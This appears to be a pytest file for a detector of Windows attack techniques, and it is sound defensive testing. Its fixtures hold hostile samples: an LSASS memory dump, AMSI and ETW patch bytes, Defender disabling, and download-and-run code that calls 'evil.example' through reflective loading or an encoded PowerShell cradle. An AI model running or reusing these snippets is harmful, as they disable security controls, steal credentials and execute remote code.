"""Tests for scripts/lib/windows_internals_patterns.py.

Pattern-coverage tests for the Wave-23 distill-round-9 Windows
system-internals catalogue (10 rules covering LSASS dump, AMSI / ETW
patches, direct syscalls, COM hijack, SeDebugPrivilege chain,
reflective .NET load, Defender tamper, encoded-PowerShell cradle,
and MOTW stripping).

Each rule has at least one positive test exercising the canary AND at
least one negative test exercising the carve-out or context filter.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import windows_internals_patterns as wip  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_contains_every_advertised_rule() -> None:
    """RULES must cover all 10 documented rule IDs."""
    assert isinstance(wip.RULES, tuple)
    rule_ids = {r.id for r in wip.RULES}
    expected = {
        "winint-lsass-minidump",
        "winint-amsi-patch",
        "winint-etw-patch",
        "winint-direct-syscall",
        "winint-com-hijack-treatas",
        "winint-sedebug-privilege",
        "winint-reflective-assembly-load",
        "winint-defender-tamper",
        "winint-ps-encoded-cradle",
        "winint-motw-strip",
    }
    assert expected == rule_ids
    assert len(wip.RULES) == 10


def test_every_rule_has_valid_owasp_and_severity() -> None:
    """Every rule maps to a valid ASI- prefix and a known severity."""
    for rule in wip.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id
        assert rule.description.strip(), rule.id
        assert rule.name.strip(), rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors chat_bot_patterns.Finding shape."""
    f = wip.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-08",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-08"


def test_empty_text_returns_empty_findings() -> None:
    """Empty input must short-circuit to []."""
    assert wip.scan_text("") == []


def _hits(rule_id: str, text: str) -> list[wip.Finding]:
    return [f for f in wip.scan_text(text) if f.rule_id == rule_id]


# ---------- W1 : winint-lsass-minidump -----------------------------------


def test_w1_lsass_openprocess_plus_minidump_flags() -> None:
    """OpenProcess(lsass) + MiniDumpWriteDump in same window → CRITICAL hit."""
    src = (
        "HANDLE h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, "
        "FALSE, GetProcessId(\"lsass.exe\"));\n"
        "MiniDumpWriteDump(h, pid, hFile, MiniDumpWithFullMemory, "
        "NULL, NULL, NULL);\n"
    )
    hits = _hits("winint-lsass-minidump", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_w1_lsass_telemetry_only_silent() -> None:
    """Telemetry-grade query-limited access only → no hit (FP suppression)."""
    src = (
        "// Defender telemetry — read process times only.\n"
        "HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, "
        "FALSE, GetProcessId(\"lsass.exe\"));\n"
        "GetProcessTimes(h, &creation, &exit, &kernel, &user);\n"
    )
    assert not _hits("winint-lsass-minidump", src)


# ---------- W2 : winint-amsi-patch ---------------------------------------


def test_w2_amsi_scanbuffer_resolve_plus_write_flags() -> None:
    """GetProcAddress(AmsiScanBuffer) + WriteProcessMemory → CRITICAL hit."""
    src = (
        "var amsi = LoadLibrary(\"amsi.dll\");\n"
        "var addr = GetProcAddress(amsi, \"AmsiScanBuffer\");\n"
        "byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n"
        "WriteProcessMemory(GetCurrentProcess(), addr, patch, "
        "(UIntPtr)patch.Length, out _);\n"
    )
    hits = _hits("winint-amsi-patch", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_w2_amsi_passive_import_silent() -> None:
    """Passive import of amsi.dll with NO memory-write primitive → no hit."""
    src = (
        "// Legitimate WDAC self-test — passive import only.\n"
        "var amsi = LoadLibrary(\"amsi.dll\");\n"
        "var addr = GetProcAddress(amsi, \"AmsiScanBuffer\");\n"
        "Console.WriteLine($\"AmsiScanBuffer @ 0x{addr.ToInt64():X}\");\n"
    )
    assert not _hits("winint-amsi-patch", src)


# ---------- W3 : winint-etw-patch ----------------------------------------


def test_w3_etw_eventwrite_resolve_plus_write_flags() -> None:
    """GetProcAddress(EtwEventWrite) + VirtualProtect → CRITICAL hit."""
    src = (
        "var ntdll = GetModuleHandle(\"ntdll.dll\");\n"
        "var addr = GetProcAddress(ntdll, \"EtwEventWrite\");\n"
        "VirtualProtect(addr, (UIntPtr)1, 0x40, out var oldProtect);\n"
        "Marshal.WriteByte(addr, 0xC3);\n"
    )
    hits = _hits("winint-etw-patch", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_w3_etw_passive_profiler_silent() -> None:
    """Passive ETW address read with NO memory-write primitive → no hit."""
    src = (
        "// Read-only profiler — no memory writes.\n"
        "var ntdll = GetModuleHandle(\"ntdll.dll\");\n"
        "var addr = GetProcAddress(ntdll, \"EtwEventWrite\");\n"
        "Console.WriteLine($\"ETW write @ 0x{addr.ToInt64():X}\");\n"
    )
    assert not _hits("winint-etw-patch", src)


# ---------- W4 : winint-direct-syscall -----------------------------------


def test_w4_ntdll_ntallocate_dllimport_flags() -> None:
    """[DllImport(ntdll)] NtAllocateVirtualMemory → CRITICAL hit."""
    src = (
        "[DllImport(\"ntdll.dll\")]\n"
        "public static extern int NtAllocateVirtualMemory("
        "IntPtr ProcessHandle, ref IntPtr BaseAddress, "
        "IntPtr ZeroBits, ref IntPtr RegionSize, "
        "uint AllocationType, uint Protect);\n"
    )
    hits = _hits("winint-direct-syscall", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_w4_ntdll_single_benign_function_silent() -> None:
    """[DllImport(ntdll)] NtQuerySystemInformation (benign) → no hit."""
    src = (
        "[DllImport(\"ntdll.dll\")]\n"
        "public static extern int NtQuerySystemInformation("
        "int SystemInformationClass, IntPtr SystemInformation, "
        "uint SystemInformationLength, out uint ReturnLength);\n"
    )
    assert not _hits("winint-direct-syscall", src)


# ---------- W5 : winint-com-hijack-treatas -------------------------------


def test_w5_hkcu_treatas_redirect_flags() -> None:
    """Set-ItemProperty on HKCU\\...\\CLSID\\{guid}\\TreatAs → HIGH hit."""
    src = (
        "Set-ItemProperty -Path "
        "'HKCU:\\Software\\Classes\\CLSID\\"
        "{0006F03A-0000-0000-C000-000000000046}\\TreatAs' "
        "-Name '(Default)' "
        "-Value '{ATTACKER-GUID-HERE-1234-5678-90ABCDEF1234}'\n"
    )
    hits = _hits("winint-com-hijack-treatas", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_w5_hklm_legitimate_clsid_write_silent() -> None:
    """HKLM CLSID InprocServer32 write outside TreatAs/InprocServer keys → no hit."""
    # A reg-add that doesn't terminate on TreatAs / InprocServer* must
    # not match the pattern. Here we write a sibling key, not the
    # hijack-relevant terminal segment.
    src = (
        "reg add HKLM\\Software\\Classes\\CLSID\\"
        "{0006F03A-0000-0000-C000-000000000046}\\ProgID "
        "/ve /d \"Outlook.Application\" /f\n"
    )
    assert not _hits("winint-com-hijack-treatas", src)


# ---------- W6 : winint-sedebug-privilege --------------------------------


def test_w6_sedebugprivilege_chain_flags() -> None:
    """OpenProcessToken + LookupPrivilegeValue(SeDebugPrivilege) + AdjustTokenPrivileges → HIGH hit."""
    src = (
        "HANDLE hToken;\n"
        "OpenProcessToken(GetCurrentProcess(), "
        "TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);\n"
        "TOKEN_PRIVILEGES tp;\n"
        "LookupPrivilegeValueA(NULL, \"SeDebugPrivilege\", &tp.Privileges[0].Luid);\n"
        "tp.PrivilegeCount = 1;\n"
        "tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n"
        "AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);\n"
    )
    hits = _hits("winint-sedebug-privilege", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_w6_sysinternals_tooling_suppresses() -> None:
    """File-level hint /sysinternals/ → no hit (FP suppression)."""
    src = (
        "// Source from /sysinternals/procexp/handle-info.c — debugger.\n"
        "OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);\n"
        "LookupPrivilegeValueA(NULL, \"SeDebugPrivilege\", &luid);\n"
        "AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);\n"
    )
    assert not _hits("winint-sedebug-privilege", src)


# ---------- W7 : winint-reflective-assembly-load -------------------------


def test_w7_reflective_load_downloaddata_flags() -> None:
    """[Reflection.Assembly]::Load([byte[]] (DownloadData ...)) → CRITICAL hit."""
    src = (
        "$bytes = (New-Object Net.WebClient).DownloadData("
        "'https://evil.example/payload.dll')\n"
        "[Reflection.Assembly]::Load([byte[]]$bytes).EntryPoint.Invoke($null, $null)\n"
    )
    hits = _hits("winint-reflective-assembly-load", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_w7_addtype_inline_csharp_silent() -> None:
    """Add-Type with inline C# source (NOT Assembly.Load) → no hit."""
    src = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "public class Demo { public static int Sum(int a, int b) { return a + b; } }\n"
        "'@\n"
        "[Demo]::Sum(1, 2)\n"
    )
    assert not _hits("winint-reflective-assembly-load", src)


# ---------- W8 : winint-defender-tamper ----------------------------------


def test_w8_disable_realtime_monitoring_flags() -> None:
    """Set-MpPreference -DisableRealtimeMonitoring $true → HIGH hit."""
    src = (
        "Set-MpPreference -DisableRealtimeMonitoring $true\n"
        "Set-MpPreference -DisableBehaviorMonitoring $true\n"
    )
    hits = _hits("winint-defender-tamper", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_w8_get_mppreference_read_silent() -> None:
    """Get-MpPreference (read-only) → no hit."""
    src = (
        "$pref = Get-MpPreference\n"
        "Write-Host $pref.DisableRealtimeMonitoring\n"
    )
    assert not _hits("winint-defender-tamper", src)


# ---------- W9 : winint-ps-encoded-cradle --------------------------------


def test_w9_powershell_enc_long_b64_flags() -> None:
    """powershell -EncodedCommand <long b64> → HIGH hit."""
    src = (
        "cmd /c powershell.exe -NoProfile -WindowStyle Hidden "
        "-EncodedCommand "
        "SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALwBjAC4AcABzADEAJwApACkA\n"
    )
    hits = _hits("winint-ps-encoded-cradle", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_w9_chocolatey_trusted_bootstrap_silent() -> None:
    """iwr chocolatey.org/install.ps1 | iex → no hit (trusted host)."""
    src = (
        "Set-ExecutionPolicy Bypass -Scope Process -Force\n"
        "iwr https://community.chocolatey.org/install.ps1 -UseBasicParsing | iex\n"
    )
    assert not _hits("winint-ps-encoded-cradle", src)


# ---------- W10 : winint-motw-strip --------------------------------------


def test_w10_unblock_file_downloads_path_flags() -> None:
    """Unblock-File $env:TEMP\\payload.exe → MEDIUM hit."""
    src = (
        "$path = Join-Path $env:TEMP 'installer.exe'\n"
        "Invoke-WebRequest 'https://evil.example/i.exe' -OutFile $path\n"
        "Unblock-File -Path $path\n"
        "& $path\n"
    )
    hits = _hits("winint-motw-strip", src)
    assert hits
    assert hits[0].severity == "MEDIUM"


def test_w10_unblock_file_program_files_silent() -> None:
    """Unblock-File 'C:\\Program Files\\...' (enterprise mirror) → no hit."""
    src = (
        "Unblock-File -Path 'C:\\Program Files\\Contoso SDK\\sdk.dll'\n"
    )
    assert not _hits("winint-motw-strip", src)
